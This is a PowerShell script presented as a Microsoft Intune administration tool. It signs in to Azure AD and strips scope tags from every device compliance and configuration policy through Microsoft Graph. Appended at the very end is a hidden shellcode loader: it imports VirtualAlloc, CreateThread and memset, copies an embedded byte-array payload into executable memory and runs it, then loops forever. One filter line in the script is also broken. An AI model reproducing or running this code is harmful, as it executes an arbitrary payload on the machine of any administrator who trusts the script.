



function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"
    
$redirectUri = "urn:ietf:wg:oauth:2.0:oob"
    
$resourceAppIdURI = "https://graph.microsoft.com"
    
$authority = "https://login.microsoftonline.com/$Tenant"
    
    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}
    


Function Get-DeviceCompliancePolicy(){



[cmdletbinding()]

param
(
    $Name,
    [switch]$Android,
    [switch]$iOS,
    [switch]$Win10,
    $id
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/deviceCompliancePolicies"

    try {

        $Count_Params = 0

        if($Android.IsPresent){ $Count_Params++ }
        if($iOS.IsPresent){ $Count_Params++ }
        if($Win10.IsPresent){ $Count_Params++ }
        if($Name.IsPresent){ $Count_Params++ }

        if($Count_Params -gt 1){

        write-host "Multiple parameters set, specify a single parameter -Android -iOS or -Win10 against the function" -f Red

        }

        elseif($Android){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("android") }

        }

        elseif($iOS){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("ios") }

        }

        elseif($Win10){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("windows10CompliancePolicy") }

        }

        elseif($Name){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") }

        }

        elseif($id){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)/$id`?`$expand=assignments,scheduledActionsForRule(`$expand=scheduledActionConfigurations)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

        }

        else {

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-DeviceConfigurationPolicy(){



[cmdletbinding()]

param
(
    $name,
    $id
)

$graphApiVersion = "Beta"
$DCP_resource = "deviceManagement/deviceConfigurations"

    try {

        if($Name){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") }

        }

        elseif($id){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)/$id"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

        }

        else {

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Update-DeviceCompliancePolicy(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $id,
    [Parameter(Mandatory=$true)]
    $Type,
    [Parameter(Mandatory=$true)]
    $ScopeTags
)

$graphApiVersion = "beta"
$Resource = "deviceManagement/deviceCompliancePolicies/$id"

    try {
     
        if($ScopeTags -eq "" -or $ScopeTags -eq $null){

$JSON = @"

{
  "@odata.type": "$Type",
  "roleScopeTagIds": []
}

"@
        }

        else {

            $object = New-Object –TypeName PSObject
            $object | Add-Member -MemberType NoteProperty -Name '@odata.type' -Value "$Type"
            $object | Add-Member -MemberType NoteProperty -Name 'roleScopeTagIds' -Value @($ScopeTags)
            $JSON = $object | ConvertTo-Json

        }

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Patch -Body $JSON -ContentType "application/json"

        Start-Sleep -Milliseconds 100

    }

    catch {

    Write-Host
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Update-DeviceConfigurationPolicy(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $id,
    [Parameter(Mandatory=$true)]
    $Type,
    [Parameter(Mandatory=$true)]
    $ScopeTags
)

$graphApiVersion = "beta"
$Resource = "deviceManagement/deviceConfigurations/$id"

    try {
     
        if($ScopeTags -eq "" -or $ScopeTags -eq $null){

$JSON = @"

{
  "@odata.type": "$Type",
  "roleScopeTagIds": []
}

"@
        }

        else {

            $object = New-Object –TypeName PSObject
            $object | Add-Member -MemberType NoteProperty -Name '@odata.type' -Value "$Type"
            $object | Add-Member -MemberType NoteProperty -Name 'roleScopeTagIds' -Value @($ScopeTags)
            $JSON = $object | ConvertTo-Json

        }

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Patch -Body $JSON -ContentType "application/json"

        Start-Sleep -Milliseconds 100

    }

    catch {

    Write-Host
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





Write-Host "Are you sure you want to remove all Scope Tags from all Configuration and Compliance Policies? Y or N?"
$Confirm = read-host

if($Confirm -eq "y" -or $Confirm -eq "Y"){

    Write-Host
    Write-Host "Device Compliance Policies" -ForegroundColor Cyan
    Write-Host "Setting all Device Compliance Policies back to no Scope Tag..."

    $CPs = Get-DeviceCompliancePolicy | Sort-Object displayName

    if($CPs){

        foreach($Policy in $CPs){

            $PolicyDN = $Policy.displayName

            $Result = Update-DeviceCompliancePolicy -id $Policy.id -Type $Policy.'@odata.type' -ScopeTags ""

            if($Result -eq ""){

                Write-Host "Compliance Policy '$PolicyDN' patched..." -ForegroundColor Gray

            }

        }

    }

    Write-Host

    

    Write-Host "Device Configuration Policies" -ForegroundColor Cyan
    Write-Host "Setting all Device Configuration Policies back to no Scope Tag..."

    $DCPs = Get-DeviceConfigurationPolicy | ? { $_.'@odata.type' -ne "

    if($DCPs){

        foreach($Policy in $DCPs){

            $PolicyDN = $Policy.displayName
            
                $Result = Update-DeviceConfigurationPolicy -id $Policy.id -Type $Policy.'@odata.type' -ScopeTags ""

                if($Result -eq ""){

                    Write-Host "Configuration Policy '$PolicyDN' patched..." -ForegroundColor Gray

                }

            }

        }

    }

else {

    Write-Host "Removal of all Scope Tags from all Configuration and Compliance Policies was cancelled..." -ForegroundColor Yellow

}

Write-Host
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0xbf,0x81,0xa3,0xaf,0x90,0x31,0xc9,0xb1,0x4b,0x31,0x7a,0x1a,0x83,0xea,0xfc,0x03,0x7a,0x16,0xe2,0x74,0x5f,0x47,0x12,0x76,0xa0,0x98,0x73,0xff,0x45,0xa9,0xb3,0x9b,0x0e,0x9a,0x03,0xe8,0x43,0x17,0xef,0xbc,0x77,0xac,0x9d,0x68,0x77,0x05,0x2b,0x4e,0xb6,0x96,0x00,0xb2,0xd9,0x14,0x5b,0xe6,0x39,0x24,0x94,0xfb,0x38,0x61,0xc9,0xf1,0x69,0x3a,0x85,0xa7,0x9d,0x4f,0xd3,0x7b,0x15,0x03,0xf5,0xfb,0xca,0xd4,0xf4,0x2a,0x5d,0x6e,0xaf,0xec,0x5f,0xa3,0xdb,0xa5,0x47,0xa0,0xe6,0x7c,0xf3,0x12,0x9c,0x7f,0xd5,0x6a,0x5d,0xd3,0x18,0x43,0xac,0x2a,0x5c,0x64,0x4f,0x59,0x94,0x96,0xf2,0x59,0x63,0xe4,0x28,0xec,0x70,0x4e,0xba,0x56,0x5d,0x6e,0x6f,0x00,0x16,0x7c,0xc4,0x47,0x70,0x61,0xdb,0x84,0x0a,0x9d,0x50,0x2b,0xdd,0x17,0x22,0x0f,0xf9,0x7c,0xf0,0x2e,0x58,0xd9,0x57,0x4f,0xba,0x82,0x08,0xf5,0xb0,0x2f,0x5c,0x84,0x9a,0x27,0x91,0xa4,0x24,0xb8,0xbd,0xbf,0x57,0x8a,0x62,0x6b,0xf0,0xa6,0xeb,0xb5,0x07,0xc8,0xc1,0x01,0x97,0x37,0xea,0x71,0xb1,0xf3,0xbe,0x21,0xa9,0xd2,0xbe,0xaa,0x29,0xda,0x6a,0x7c,0x7a,0x74,0xc5,0x3c,0x2a,0x34,0xb5,0xd4,0x20,0xbb,0xea,0xc4,0x4a,0x11,0x83,0x6e,0xb0,0xf2,0x6c,0xc6,0xce,0x81,0x05,0x14,0x2f,0x87,0x6e,0x91,0xc9,0xed,0x80,0xf7,0x42,0x9a,0x39,0x52,0x18,0x3b,0xc5,0x49,0x64,0x7b,0x4d,0x7b,0x98,0x32,0xa6,0x0e,0x8a,0x23,0x89,0xf0,0x52,0xb4,0x9c,0xf0,0x38,0xb0,0x36,0xa7,0xd4,0xba,0x6f,0x8f,0x7a,0x44,0x5a,0x8c,0x7d,0xba,0x1b,0x7b,0xf6,0x8d,0x89,0x3b,0x61,0xf2,0x5d,0xbb,0x71,0xa4,0x37,0xbb,0x19,0x10,0x6c,0xe8,0x3c,0x5f,0xb9,0x9d,0xec,0xca,0x42,0xf7,0x41,0x5c,0x2b,0xf5,0xbc,0xaa,0xf4,0x06,0xeb,0xa8,0xf3,0xf8,0x6a,0x6c,0x02,0x3b,0xbb,0xb4,0x70,0x52,0x7f,0x83,0x8b,0x11,0x22,0xa2,0x01,0x59,0x70,0xb4,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

